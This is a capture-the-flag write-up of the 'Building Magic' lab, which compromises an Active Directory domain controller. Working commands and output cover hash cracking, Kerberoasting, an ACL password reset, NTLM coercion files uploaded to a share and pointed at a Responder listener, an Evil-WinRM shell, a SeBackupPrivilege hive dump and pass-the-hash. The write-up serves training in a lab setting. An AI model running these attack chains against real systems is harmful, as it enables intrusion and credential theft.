---
title: "Building Magic"
platform: "HackSmarter"
category: "Active Directory"
difficulty: "Medium"
date: 2025-12-31
os: "Windows Server 2022"
tags: ["active-directory", "kerberoasting", "ntlm-coercion", "bloodhound", "password-spraying", "acl-abuse", "sebackupprivilege", "hash-cracking"]
---

![Building Magic Banner](/assets/images/ctf/buildingmagic/banner.png)

---

## Scenario

### Objective and Scope

As a penetration tester on the Hack Smarter Red Team, your objective is to achieve a full compromise of the Active Directory environment. A prior enumeration phase has yielded a leaked database containing user credentials (usernames and hashed passwords). This information will serve as your starting point for gaining initial access to the network.

Your task is to leverage the compromised credentials to escalate privileges, move laterally through the Active Directory, and ultimately achieve a complete compromise of the domain.

**Note:** To access the target machine, you must add the following entries to your `/etc/hosts` file:
- `buildingmagic.local`
- `dc01.buildingmagic.local`

### Leaked Database

| ID | Username | Full Name | Role | Password Hash |
|----|----------|-----------|------|---------------|
| 1 | r.widdleton | Ron Widdleton | Intern Builder | [HASH REDACTED] |
| 2 | n.bottomsworth | Neville Bottomsworth | Planner | [HASH REDACTED] |
| 3 | l.layman | Luna Layman | Planner | [HASH REDACTED] |
| 4 | c.smith | Chen Smith | Builder | [HASH REDACTED] |
| 5 | d.thomas | Dean Thomas | Builder | [HASH REDACTED] |
| 6 | s.winnigan | Samuel Winnigan | HR Manager | [HASH REDACTED] |
| 7 | p.jackson | Parvati Jackson | Shift Lead | [HASH REDACTED] |
| 8 | b.builder | Bob Builder | Electrician | [HASH REDACTED] |
| 9 | t.ren | Theodore Ren | Safety Officer | [HASH REDACTED] |
| 10 | e.macmillan | Ernest Macmillan | Surveyor | [HASH REDACTED] |

**Difficulty:** Medium
**OS:** Windows Server 2022

---

## Enumeration

### Port Scanning

Starting enumeration with UwU Toolkit's nmap module to identify open services on the target domain controller:

```
UwU Toolkit nmap_scan > set RHOSTS 10.1.75.69
RHOSTS => 10.1.75.69
UwU Toolkit nmap_scan > run
[*] Running nmap_scan...

[*] Running standard scan against 10.1.75.69
[*] Command: nmap -sC -sV -T4 -oA /workspace/./nmap_results/scan_10.1.75.69_standard 10.1.75.69

Starting Nmap 7.93 ( https://nmap.org ) at 2025-12-31 09:40 PST
Stats: 0:01:58 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.95% done; ETC: 09:42 (0:00:00 remaining)
Nmap scan report for 10.1.75.69
Host is up (0.070s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-31 17:40:15Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BUILDINGMAGIC.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BUILDINGMAGIC.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: BUILDINGMAGIC
|   NetBIOS_Domain_Name: BUILDINGMAGIC
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: BUILDINGMAGIC.LOCAL
|   DNS_Computer_Name: DC01.BUILDINGMAGIC.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-31T17:41:44+00:00
| ssl-cert: Subject: commonName=DC01.BUILDINGMAGIC.LOCAL
| Not valid before: 2025-09-02T21:29:10
|_Not valid after:  2026-03-04T21:29:10
|_ssl-date: 2025-12-31T17:42:24+00:00; -1s from scanner time.
8080/tcp open  http-proxy    Werkzeug/3.1.3 Python/3.13.3
|_http-server-header: Werkzeug/3.1.3 Python/3.13.3
|_http-title: Building Magic Application Portal
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-12-31T17:41:46
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 142.12 seconds

[+] Module completed successfully
```

The scan reveals a typical Active Directory Domain Controller configuration with an additional web application running on port 8080 (Building Magic Application Portal). Key observations:
- **DC01.BUILDINGMAGIC.LOCAL** - Windows Server 2022
- **SMB signing enabled and required** - prevents relay attacks
- **Standard AD ports** - DNS, Kerberos, LDAP, SMB, RDP
- **Web application** - Python/Werkzeug on port 8080

---

## Initial Access

### Cracking the Leaked Hashes

The leaked database contains MD5 hashes. Using UwU Toolkit's hashcrack module to attempt password recovery:

```
UwU Toolkit hashcrack > run
[*] Running hashcrack...

[*] Loaded hashes from: /workspace/test.txt
[*] No hash type specified, attempting to identify...
[+] Detected hash type: NTLM (or MD5 - mode 0) (mode: 1000)
[*] Sample hash: [HASH REDACTED]...

[?] Use hash type 1000 (NTLM (or MD5 - mode 0))? [Y/n]: y
[*] Transferring hashes to omarchy...
[*] Running hashcat on omarchy...
[*] Command: hashcat -m 1000 /tmp/uwu_hashes_91063.txt $HOME/tools/rockyou.txt

hashcat (v7.1.2) starting

CUDA API (CUDA 13.0)
====================
* Device #01: NVIDIA GeForce RTX 4070 Laptop GPU, 6564/7805 MB, 36MCU

Hashes: 10 digests; 10 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: /tmp/uwu_hashes_91063.txt
Time.Started.....: Wed Dec 31 09:59:59 2025 (0 secs)
Time.Estimated...: Wed Dec 31 09:59:59 2025 (0 secs)
Speed.#01........: 24675.5 kH/s (2.56ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/10 (10.00%) Digests (total), 0/10 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)

Started: Wed Dec 31 09:59:58 2025
Stopped: Wed Dec 31 10:00:00 2025

=== CRACKED ===
[HASH REDACTED]:[REDACTED]

[+] Module completed successfully
```

Successfully recovered one password for user `r.widdleton`.

### Validating Credentials

Using NetExec to validate the cracked credentials against the domain:

```
UwU Toolkit netexec > set USER /workspace/users.txt
USER => /workspace/users.txt
UwU Toolkit netexec > run
[*] Running netexec...

[*] Target: 10.1.61.93
[*] User: /workspace/users.txt
[*] Protocol: SMB
[*] Action: check

[*] Executing: NetExec smb 10.1.61.93 -u /workspace/users.txt -p '[REDACTED]'

[*] SMB         10.1.61.93      445    DC01             Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
[+] SMB         10.1.61.93      445    DC01             [+] BUILDINGMAGIC.LOCAL\r.widdleton:[REDACTED]
```

Credentials confirmed valid. Generating the hosts file for proper name resolution:

```
Exegol > nxc smb 10.1.61.93 -u users.txt -p '[REDACTED]' --generate-hosts-file /etc/hosts
SMB         10.1.61.93      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.61.93      445    DC01             [+] BUILDINGMAGIC.LOCAL\r.widdleton:[REDACTED]

Exegol > cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::  ip6-localnet
ff00::  ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.4      exegol-bui
10.1.61.93     DC01.BUILDINGMAGIC.LOCAL BUILDINGMAGIC.LOCAL DC01
```

---

## Active Directory Enumeration

### BloodHound Collection

Using UwU Toolkit's BloodHound collection module with RustHound to gather comprehensive AD data:

```
UwU Toolkit bloodhound_collect > set RUSTHOUND yes
RUSTHOUND => yes
UwU Toolkit bloodhound_collect > run
[*] Running bloodhound_collect...

[*] Collector: RustHound
[*] Target DC: 10.1.61.93
[*] Domain: BUILDINGMAGIC.LOCAL
[*] User: r.widdleton
[*] Collection: all
[*] Output: /workspace/bloodhound_output

[*] Command: rusthound --domain BUILDINGMAGIC.LOCAL --ldapip 10.1.61.93 --ldapusername r.widdleton --ldappassword [REDACTED] --dns-tcp --name-server 10.1.61.93 --adcs --zip -o /workspace/bloodhound_output

[*] Using local RustHound
[*] [2025-12-31T18:19:03Z INFO  rusthound::ldap] Starting data collection...
[*] [2025-12-31T18:19:04Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[+]   [2025-12-31T18:19:04Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10
[+]   [2025-12-31T18:19:04Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[*] [2025-12-31T18:19:04Z INFO  rusthound::json::checker] Starting checker to replace some values...
[+]   [2025-12-31T18:19:04Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[*] [2025-12-31T18:19:04Z INFO  rusthound::modules] Starting checker for ADCS values...
[+]   [2025-12-31T18:19:04Z INFO  rusthound::modules] Checking for ADCS values finished!
[+]   [2025-12-31T18:19:04Z INFO  rusthound::json::maker] 9 users parsed!
[+]   [2025-12-31T18:19:04Z INFO  rusthound::json::maker] 60 groups parsed!
[+]   [2025-12-31T18:19:04Z INFO  rusthound::json::maker] 1 computers parsed!
[+]   [2025-12-31T18:19:04Z INFO  rusthound::json::maker] 2 ous parsed!
[+]   [2025-12-31T18:19:04Z INFO  rusthound::json::maker] 1 domains parsed!
[+]   [2025-12-31T18:19:04Z INFO  rusthound::json::maker] 3 gpos parsed!
[+]   [2025-12-31T18:19:04Z INFO  rusthound::json::maker] 21 containers parsed!
[+]   [2025-12-31T18:19:04Z INFO  rusthound::json::maker] 0 cas parsed!
[+]   [2025-12-31T18:19:04Z INFO  rusthound::json::maker] 0 templates parsed!
[+]   [2025-12-31T18:19:04Z INFO  rusthound::json::maker] /workspace/bloodhound_output/20251231101904_buildingmagic-local_rusthound.zip created!

[+] RustHound collection completed!
[*] ZIP file saved to: /workspace/bloodhound_output/
[*] Import the output into BloodHound CE for analysis

[+] Module completed successfully
```

Analyzing the BloodHound data reveals that our initial user `r.widdleton` has limited permissions in the domain:

![BloodHound User Analysis](/assets/images/ctf/buildingmagic/bloodhound-user.png)

### Comprehensive AD Enumeration

Using the `ad_enumerate_all` module for automated enumeration of common attack vectors:

```
UwU Toolkit ad_enumerate_all > run
[*] Running ad_enumerate_all...

    ╔══════════════════════════════════════════════════════════════════╗
    ║     _    ____    _____ _   _ _   _ __  __ _____ ____      _  _____ ║
    ║    / \  |  _ \  | ____| \ | | | | |  \/  | ____|  _ \    / \|_   _|║
    ║   / _ \ | | | | |  _| |  \| | | | | |\/| |  _| | |_) |  / _ \ | |  ║
    ║  / ___ \| |_| | | |___| |\  | |_| | |  | | |___|  _ <  / ___ \| |  ║
    ║ /_/   \_\____/  |_____|_| \_|\___/|_|  |_|_____|_| \_\/_/   \_\_|  ║
    ║                                                                  ║
    ║     Comprehensive AD Enumeration - No RDP Required              ║
    ╚══════════════════════════════════════════════════════════════════╝

Target DC: 10.1.83.237
Domain: BUILDINGMAGIC.LOCAL
User: r.widdleton
Output: /workspace/ad_enum_results


[*] [1/9] LDAP Enumeration
--------------------------------------------------
[*]   Using local ldapdomaindump...
[+]   LDAP enumeration complete
[+]     users: OK
[+]     computers: OK
[+]     groups: OK
[+]     domain_info: OK
[+]     trusts: OK

╔══════════╣ Passwords in Descriptions
  No passwords found in descriptions

╔══════════╣ Delegation Settings
  No dangerous delegation settings found

[*] [4/9] Enumerating Domain Trusts
--------------------------------------------------
[*]   No trusts found

[*] [5/9] Enumerating GPOs
--------------------------------------------------
[+]   Found 0 GPOs

[*] [6/9] BloodHound Collection
--------------------------------------------------
[*]   Command: bloodhound-python -u r.widdleton -p [HIDDEN] -d BUILDINGMAGIC.LOCAL -ns 10.1.83.237 -c all --zip -op /workspace/ad_enum_results/bloodhound/
[*]   Running collection (this may take a while)...
[+]   BloodHound collection complete
[+]     Output: _20251231105835_bloodhound.zip

╔══════════╣ Kerberoasting
  ► KERBEROASTABLE USERS FOUND!
     1 TGS hashes captured
    Crack: hashcat -m 13100 /workspace/ad_enum_results/kerberoast_hashes_20251231_105615.txt wordlist.txt

╔══════════╣ ASREPRoasting
  No ASREPRoastable users found

[*] [9/9] SMB Share Enumeration
--------------------------------------------------
[+]   Shares enumerated:
[*]     SMB         10.1.83.237     445    DC01             IPC$            READ            Remote IPC

════════════════════════[ PRIVILEGED GROUPS ]════════════════════════

   !!  Domain Admins (1 members)
      Full domain admin rights
      • Administrator
   !!  Enterprise Admins (1 members)
      Forest-wide admin rights
      • Administrator
   !!  Administrators (4 members)
      Local admin on DCs
      • Argus Flatch
      • Domain Admins
      • Enterprise Admins
      • Administrator
   !!  Schema Admins (1 members)
      Can modify AD schema, backdoor GPOs
      • Administrator
  ► Remote Management Users (1 members)
      PSRemoting access to DCs
      • Harriot Grangon
  ► Group Policy Creator Owners (1 members)
      Can create GPOs
      • Administrator

   9 users in privileged groups!

════════════════════════[ AD CS ENUMERATION ]════════════════════════

  Command: certipy find -u r.widdleton@BUILDINGMAGIC.LOCAL -p [HIDDEN] -dc-ip 10.1.83.237 -vulnerable
  No vulnerable certificate templates found

═════════════════════════[ FINDINGS SUMMARY ]═════════════════════════

  HIGH: 2

[+] ======================================================================
[+]   ENUMERATION COMPLETE
[+] ======================================================================
[*] Tasks completed: 11/11
[*] Results saved to: /workspace/ad_enum_results

[+] Module completed successfully
```

Key findings from enumeration:
- **Kerberoastable user found** - service account with SPN
- **Harriot Grangon** - member of Remote Management Users (WinRM access)
- **Argus Flatch** - member of Administrators group
- **No AD CS vulnerabilities** detected

---

## Privilege Escalation Path 1: Kerberoasting

### Extracting and Cracking Service Account Hash

The enumeration identified a Kerberoastable service account. The hash was automatically cracked:

```
=== CRACKED ===
$krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$BUILDINGMAGIC.LOCAL/r.haggard*$...[TRUNCATED]...:[REDACTED]
```

### ACL Abuse - ForceChangePassword

Analysis in BloodHound reveals that `r.haggard` has the **ForceChangePassword** privilege over user `h.potch`:

![ForceChangePassword ACL](/assets/images/ctf/buildingmagic/forcechangepassword.png)

Using the `bloody_setpass` module to exploit this ACL:

```
UwU Toolkit bloody_setpass > options

Module options:

Name               Current               Required   Description
------------------ --------------------- ---------- ---------------------------------------------
DOMAIN             BUILDINGMAGIC.LOCAL   yes        Domain name
NEW_PASS                                 yes        New password for target
PASS               [REDACTED]            yes        Password for USER
RHOSTS             10.1.83.237           yes        Domain Controller IP
TARGET_USER                              yes        Target user to reset password
USER               r.haggard             yes        Username with ACL permissions

UwU Toolkit bloody_setpass > set TARGET_USER h.potch
TARGET_USER => h.potch
UwU Toolkit bloody_setpass > set NEW_PASS [REDACTED]
NEW_PASS => [REDACTED]
UwU Toolkit bloody_setpass > run
[*] Running bloody_setpass...

[*] Target DC: 10.1.83.237
[*] Domain: BUILDINGMAGIC.LOCAL
[*] Attacking User: r.haggard
[*] Target User: h.potch
[*] New Password: [REDACTED]

[*] Command: bloodyAD -u r.haggard -p [HIDDEN] -d BUILDINGMAGIC.LOCAL --host 10.1.83.237 set password h.potch [HIDDEN]

[+] Password changed successfully!
[+] New credentials: h.potch:[REDACTED]

[*] Next steps:
[*]   setg USER h.potch
[*]   setg PASS [REDACTED]

[+] Module completed successfully
```

### Share Enumeration with New Credentials

Validating the new credentials and enumerating accessible shares:

```
UwU Toolkit netexec > creds use 1
[*] USER => h.potch
[*] PASS => [REDACTED]
[+] Loaded credential: 1

UwU Toolkit netexec > set action shares
ACTION => shares
UwU Toolkit netexec > run
[*] Running netexec...

[*] Target: 10.1.83.237
[*] Domain: BUILDINGMAGIC.LOCAL
[*] User: h.potch
[*] Protocol: SMB
[*] Action: shares

[*] Executing: NetExec smb 10.1.83.237 -u h.potch -p '[REDACTED]' -d BUILDINGMAGIC.LOCAL --shares

[*] SMB         10.1.83.237     445    DC01             Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
[+] SMB         10.1.83.237     445    DC01             [+] BUILDINGMAGIC.LOCAL\h.potch:[REDACTED]
[*] SMB         10.1.83.237     445    DC01             Enumerated shares
    SMB         10.1.83.237     445    DC01             Share           Permissions     Remark
    SMB         10.1.83.237     445    DC01             -----           -----------     ------
    SMB         10.1.83.237     445    DC01             ADMIN$                          Remote Admin
    SMB         10.1.83.237     445    DC01             C$                              Default share
    SMB         10.1.83.237     445    DC01             File-Share      READ,WRITE      Central Repository of Building Magic's files.
    SMB         10.1.83.237     445    DC01             IPC$            READ            Remote IPC
    SMB         10.1.83.237     445    DC01             NETLOGON        READ            Logon server share
    SMB         10.1.83.237     445    DC01             SYSVOL          READ            Logon server share
```

The user `h.potch` has **READ,WRITE** access to the `File-Share` share, which presents an opportunity for NTLM coercion attacks.

---

## NTLM Coercion Attack

### Generating Malicious Files

Since `h.potch` has write access to a file share that other users likely access, we can use NTLM coercion files to capture hashes. Using the `ntlm_coerce` module:

```
UwU Toolkit ntlm_coerce > options

Module options:

Name               Current               Required   Description
------------------ --------------------- ---------- ---------------------------------------------
DOMAIN             BUILDINGMAGIC.LOCAL   no         Domain for SMB auth
FILENAME           @important            no         Base filename for generated files
FILE_TYPE          all                   no         File types to generate
LHOST              10.200.26.233         yes        Listener IP (your Responder IP)
OUTPUT_DIR         ntlm_theft_output     no         Output directory for files
PASS               [REDACTED]            no         Password for SMB auth
REMOTE_PATH                              no         Remote path within share (optional)
RHOSTS             10.0.31.111           no         Target host for upload
SHARE              File-Share            no         Share name for upload
UPLOAD             yes                   no         Upload to target share
USER               h.potch               no         Username for SMB auth

UwU Toolkit ntlm_coerce > run
[*] Running ntlm_coerce...

[*] Listener IP: 10.200.26.233
[*] Filename: @important
[*] File types: all
[*] Output: /workspace/ntlm_theft_output

[*] Running ntlm_theft...

[+] ntlm_theft completed successfully

[+] Generated 23 file(s):
  @important-(externalcell).xlsx
  @important-(frameset).docx
  @important-(fulldocx).xml
  @important-(handler).htm
  @important-(icon).url
  @important-(includepicture).docx
  @important-(remotetemplate).docx
  @important-(stylesheet).xml
  @important-(url).url
  @important.application
  @important.asx
  @important.htm
  @important.jnlp
  @important.library-ms
  @important.lnk
  @important.m3u
  @important.pdf
  @important.rtf
  @important.scf
  @important.theme
  @important.wax
  Autorun.inf
  desktop.ini

[*] Uploading to \\10.0.31.111\File-Share...
[+]   Uploaded: @important-(externalcell).xlsx
[+]   Uploaded: @important-(frameset).docx
[+]   Uploaded: @important-(fulldocx).xml
[+]   Uploaded: @important-(handler).htm
[+]   Uploaded: @important-(icon).url
[+]   Uploaded: @important-(includepicture).docx
[+]   Uploaded: @important-(remotetemplate).docx
[+]   Uploaded: @important-(stylesheet).xml
[+]   Uploaded: @important-(url).url
[+]   Uploaded: @important.application
[+]   Uploaded: @important.asx
[+]   Uploaded: @important.htm
[+]   Uploaded: @important.jnlp
[+]   Uploaded: @important.library-ms
[+]   Uploaded: @important.lnk
[+]   Uploaded: @important.m3u
[+]   Uploaded: @important.pdf
[+]   Uploaded: @important.rtf
[+]   Uploaded: @important.scf
[+]   Uploaded: @important.theme
[+]   Uploaded: @important.wax
[+]   Uploaded: Autorun.inf
[+]   Uploaded: desktop.ini

[*] Start Responder before user browses to share:
  responder -I tun0 -v

[*] Or use ntlmrelayx for relay attacks:
  ntlmrelayx.py -tf targets.txt -smb2support

[+] Module completed successfully
```

### Capturing NTLMv2 Hash

With Responder running, when a user browses to the file share, their NTLMv2 hash is captured:

```
[SMB] NTLMv2-SSP Hash     : h.grangon::BUILDINGMAGIC:[HASH REDACTED]
[*] Skipping previously captured hash for BUILDINGMAGIC\h.grangon
```

### Cracking the Captured Hash

Using hashcat to crack the NTLMv2 hash:

```
=== CRACKED ===
H.GRANGON::BUILDINGMAGIC:...[HASH]...:[REDACTED]
```

---

## Remote Access via WinRM

The user `h.grangon` is a member of the **Remote Management Users** group, allowing WinRM access:

```
Exegol > evil-winrm -i dc01.buildingmagic.local -u h.grangon -p [REDACTED]

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\h.grangon\Documents>
```

### Privilege Analysis

Checking user privileges reveals SeBackupPrivilege:

```
*Evil-WinRM* PS C:\Users\h.grangon> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

**SeBackupPrivilege** allows reading any file on the system, including sensitive registry hives containing password hashes.

---

## SeBackupPrivilege Exploitation

### Extracting Registry Hives

Using a custom UwU Toolkit module to extract SAM, SYSTEM, and SECURITY hives:

```
UwU Toolkit > use sebackup_dump
[+] Using module: post/sebackup_dump
UwU Toolkit sebackup_dump > run
[*] Running sebackup_dump...

[*] Target: 10.1.244.1
[*] User: BUILDINGMAGIC.LOCAL\h.grangon
[*] Method: winrm
[*] Output: /workspace/hives

[*] Using evil-winrm for extraction...
[*] Remote path: C:\Temp
[*] Saving registry hives on target...
[*]   mkdir...
[+]     OK
[*]   sam...
[+]     OK
[*]   system...
[+]     OK
[*]   security...
[*] Downloading hives via evil-winrm...
[*]   Running downloads...

[+]     sam downloaded (49152 bytes)
[+]     system downloaded (16424960 bytes)
[!]     security download failed
[+]   sam: 49152 bytes
[+]   system: 16424960 bytes
[!]   security: not found

[*] Running secretsdump on hives...

    Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: [REDACTED]
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

The SAM and SYSTEM hives were successfully extracted, revealing the local Administrator hash.

---

## Domain Compromise

### Identifying Administrator Account

The extracted hash is for the local Administrator account. Reviewing BloodHound data shows that **a.flatch** is a member of the domain Administrators group:

![Admin Group Membership](/assets/images/ctf/buildingmagic/admin-group.png)

### Pass-the-Hash Attack

Attempting to authenticate as `a.flatch` using the extracted NTLM hash:

```
Exegol > evil-winrm -i dc01.buildingmagic.local -u a.flatch -H [REDACTED]

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\a.flatch\Documents>
```

**Domain Administrator access achieved!**

---

## Key Takeaways

1. **Weak Password Policies** - MD5 hashes in leaked database were easily cracked
2. **Kerberoasting** - Service accounts with SPNs using weak passwords
3. **ACL Misconfigurations** - ForceChangePassword permission allows credential theft
4. **Writable Shares** - Can be leveraged for NTLM coercion attacks
5. **Privileged Group Membership** - SeBackupPrivilege enables registry hive extraction
6. **Password Reuse** - Local admin hash worked for domain admin account

---

## Tools Used

- **UwU Toolkit** - Penetration testing framework
- **NetExec (nxc)** - Network enumeration and exploitation
- **RustHound** - BloodHound data collector
- **BloodHound CE** - AD attack path visualization
- **Evil-WinRM** - WinRM shell for Windows
- **Responder** - LLMNR/NBT-NS/MDNS poisoner
- **ntlm_theft** - NTLM coercion file generator
- **bloodyAD** - AD exploitation toolkit
- **Impacket** - Python library for network protocols
- **Hashcat** - Password cracking

---

## References

- [HackTricks - Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
- [HackTricks - SeBackupPrivilege](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#sebackupprivilege)
- [HackTricks - NTLM Theft](https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [ntlm_theft GitHub](https://github.com/Greenwolf/ntlm_theft)
